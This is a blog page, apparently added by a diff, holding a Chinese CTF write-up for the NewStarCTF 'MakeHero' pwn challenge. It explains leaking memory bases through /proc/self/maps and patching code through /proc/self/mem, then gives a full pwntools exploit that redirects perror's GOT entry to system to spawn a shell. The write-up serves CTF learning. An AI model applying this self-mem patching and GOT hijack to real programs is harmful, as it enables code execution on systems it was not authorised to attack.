@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Mr.BW">
+
+
+
+
+
+<title>利用proc/self/mem实现任意地址写 | Mr.BW的妙妙屋</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="/../fonts/iconfont3/iconfont.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+        
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Mr.BW&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Mr.BW&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">类别</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">施工中</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">回到底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部收起"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">利用proc/self/mem实现任意地址写</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Mr.BW</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 3, 2024&nbsp;&nbsp;15:20:21</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/ctf/">ctf</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h1><p>linux的根目录下的proc里存放着当前正在运行的进程，通过pid号来访问各个进程运行的信息</p>
+<p>proc里的self则存放打开这个文件的进程信息如果通过cat指令<code>cat /proc/self/maps</code>则会显示<code>/usr/bin/cat</code>这个进程下的内存映射信息</p>
+<p>如果通过某个可执行文件的open函数来打开<code>/proc/self/maps</code>则会显示当前文件下的内存分布信息，因此<code>/proc/self/maps</code>可以用来泄露libcbase，PIEbase，heapbase</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/1.png" alt="1"></p>
+<p>类似于gdb中vmmap查看内存映射信息</p>
+<p><code>/proc/self/mem</code>则允许访问当前进程的内存内容，若对<code>/proc/self/mem</code>直接进行修改，相当于修改本文件下的内存数据，而且对该文件修改可以<strong>忽略内存权限直接修改</strong>，不仅仅可以修改段，也可以修改r x段直接影响程序运行 </p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>2024NewStarCTF week4 MakeHero</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/2.png" alt="2"></p>
+<p>初始化函数，此处读取<code>/proc/self/maps</code>内容打印libcbase和piebase</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/4.png" alt="4"></p>
+<p>如图所示</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/3.png" alt="3"></p>
+<p>main函数提供了两次进入<code>sub_1369()</code>函数的机会，<code>sub_1369()</code>就是打开<code>/proc/self/mem</code>并修改</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/5.png" alt="5"></p>
+<p>lseek的偏移在mem文件中和在运行中的文件一样，偏移量也一样，根据此处的偏移去寻找地址，并用write函数进行修改，一次仅仅能修改一个字节</p>
+<p>main函数中仅有两次修改机会，第一次修改elf文件，第二次修改libc文件</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>本题思路全程修改elf，没用到修改libc，在v5&#x3D;&#x3D;1进入if执行修改elf</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/6.png" alt="6"></p>
+<p>第一次修改，修改text段，把v5&#x3D;&#x3D;1处的jnz改成jz这样后续可以继续进入if判断来修改elf</p>
+<p>第二三次修改，把!v5–处的jnz改成jz，之后再改回来，这样v5为0时不会退出后续v5减成负数程序也不会退出</p>
+<p><img src="/../image/%E5%88%A9%E7%94%A8proc-self-mem%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99/7.png" alt="7"></p>
+<p>三次修改完，程序可以无限次修改elf，此处把<code>sub_1369()</code>里的<code>perror()</code>函数的got表指向system，write字符串改成sh，这样，只要执行到<code>perror(&quot;write&quot;)</code>就可以getshell，为了触发这个错误，把write函数的第三个参数修改，这样write的返回值不为1，跳到<code>perror(&quot;write&quot;)</code>成功getshell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./pwn_tools/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)<span class="comment">#</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r=process(<span class="string">&#x27;./MakeHero&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;challenge.basectf.fun&#x27;,49570)#libc 2.35 0 3.7</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line"><span class="comment">#=================================================================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;** &quot;</span>)</span><br><span class="line">pie=ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">pie=<span class="built_in">int</span>(pie,<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&quot;## &quot;</span>)</span><br><span class="line">base=ru(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">base=<span class="built_in">int</span>(base,<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(pie))</span><br><span class="line">log.success(<span class="built_in">hex</span>(base))</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x17e4</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;74&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(r)</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x1881</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;84&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x1881</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;85&quot;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x2031</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;73&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x2032</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;68&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x2033</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;00&quot;</span>)<span class="comment">#sh\x00</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x3fb0</span>+<span class="number">1</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;0d&quot;</span>)</span><br><span class="line"></span><br><span class="line">libcbase=base//<span class="number">0x100000</span></span><br><span class="line">libcbase=libcbase%<span class="number">0x10</span>*<span class="number">0x10</span>+<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(libcbase)</span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x3fb0</span>+<span class="number">2</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">sl(<span class="built_in">hex</span>(libcbase))<span class="comment">#system</span></span><br><span class="line"><span class="comment">#s(p64(libcbase))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(<span class="built_in">hex</span>(pie+<span class="number">0x140e</span>+<span class="number">3</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ctf/"># ctf</a>
+                    
+                        <a href="/tags/pwn/"># pwn</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%A8%80%E7%96%8F%E7%9F%A9%E9%98%B5%EF%BC%8C%E6%A0%88%EF%BC%8C%E9%98%9F%E5%88%97/">数据结构--稀疏矩阵，栈，队列</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
